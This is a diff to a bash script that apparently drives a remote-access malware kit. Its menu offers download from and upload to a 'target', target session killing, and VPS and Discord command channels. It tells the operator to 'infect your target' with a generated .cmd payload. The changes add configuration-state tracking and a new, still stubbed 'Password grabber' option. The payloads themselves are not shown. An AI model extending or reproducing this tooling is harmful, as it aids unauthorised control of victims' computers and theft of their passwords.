@@ -5,6 +5,7 @@
 cyan="\e[36m"
 gras="\e[1m"
 red="\e[31m"
+green="\e[32m"
 reset="\e[0m"
 
 
@@ -34,17 +35,39 @@ echo "
 
     echo -e "${gras}"
 
+    vps_state=$(sed -n '2p' "./bin/state_machine.txt" | tr -d '\r')
+    discord_state=$(sed -n '1p' "./bin/state_machine.txt" | tr -d '\r')
+
+    color_state_vps="${red}"
+    alarm_state_vps="No"
+    color_state_discord="${red}"
+    alarm_state_discord="No"
+
+    if [ "$vps_state" = 1 ]; then
+        color_state_vps="${green}"
+        alarm_state_vps="Yes"
+    fi
+
+    if [ "$discord_state" = 1 ]; then
+        color_state_discord="${green}"
+        alarm_state_discord="Yes"
+    fi
+
+
+
+
     echo "                                         Welcome ! Please choose an option : "
-    echo "                                          ---------------***---------------"
-    echo ""
-    echo "[+] Commands : "
+    echo -e "                                          ---------------***---------------                   ${cyan}      [+] State : ${reset} ${gras}"
+    echo -e "                                                                                    [*] Discord Configuration : ${color_state_discord} ${alarm_state_discord} ${reset} ${gras}"
+    echo -e "[+] Commands :                                                                      [*] VPS Configuration     : ${color_state_vps} ${alarm_state_vps} ${reset} ${gras}"
     echo "               "
     echo "      [user]...............Choose a user"
     echo "      [console]........Start the console"
     echo "      [discord].....Setting your discord"
     echo "      [vps]...............Setting-up VPS"
-    echo "      [download].....Download from target"
-    echo "      [upload]...........Upload to target"
+    echo "      [download]....Download from target"
+    echo "      [upload]..........Upload to target"
+    echo "      [grabber].........Password grabber"
     echo "      [killsession]..Kill target session"
     echo "      [reset]...........Restore settings"
     echo "      [quit]...........Leave the program"
@@ -449,6 +472,8 @@ vps_menu(){
     sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'reboot'
 
     cp ./src/initial_vps.cmd ./payloads_generated/initial_vps.cmd
+    sed -i '2s/.*/1/' ./bin/state_machine.txt
+
 
     echo "[+] Key set ! Please infect your target with payloads_generated/initial_vps.cmd "
     read -p "[+] Click Enter to go back to the menu !............."
@@ -483,6 +508,7 @@ discord_menu(){
     clear
     echo "Discord server has been added..."
     cp ./src/initial_local.cmd ./payloads_generated/initial_local.cmd
+    sed -i '1s/.*/1/' ./bin/state_machine.txt
     echo ""
     read -p "Click Enter to go back to the menu...." dummy
 
@@ -524,6 +550,7 @@ reset_menu(){
         
         clear
         echo -e "${gras} ${red}"
+        sed -i '1s/.*/0/' ./bin/state_machine.txt
         echo "[+] Options are reset !"
         echo -e "${reset}"
         sleep 2
@@ -549,6 +576,7 @@ reset_menu(){
             rm ./key ./key.pub
             rm ./vps_settings/vps_conf.txt
             cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
+            sed -i '2s/.*/0/' ./bin/state_machine.txt
             clear
             echo -e "${gras} ${red}"
             echo "[+] Options are reset !"
@@ -594,6 +622,8 @@ reset_menu(){
 
             clear
             echo -e "${gras} ${red}"
+            sed -i '1s/.*/0/' ./bin/state_machine.txt
+            sed -i '2s/.*/0/' ./bin/state_machine.txt
             echo "[+] Options are reset !"
             echo -e "${reset}"
             sleep 2
@@ -742,6 +772,23 @@ help_menu(){
 
 ### Help Menu--------------------------------------------
 
+### grabber Menu--------------------------------------------
+
+grabber_menu(){
+
+    clear
+    echo "test"
+    read -p "Enter...." dummy
+
+
+}
+
+### grabber Menu--------------------------------------------
+
+
+
+
+
 
 
 
@@ -789,6 +836,11 @@ do
     upload)
 
         upload_menu
+        ;;
+
+    grabber)
+
+        grabber_menu
         ;;
     
     reset)
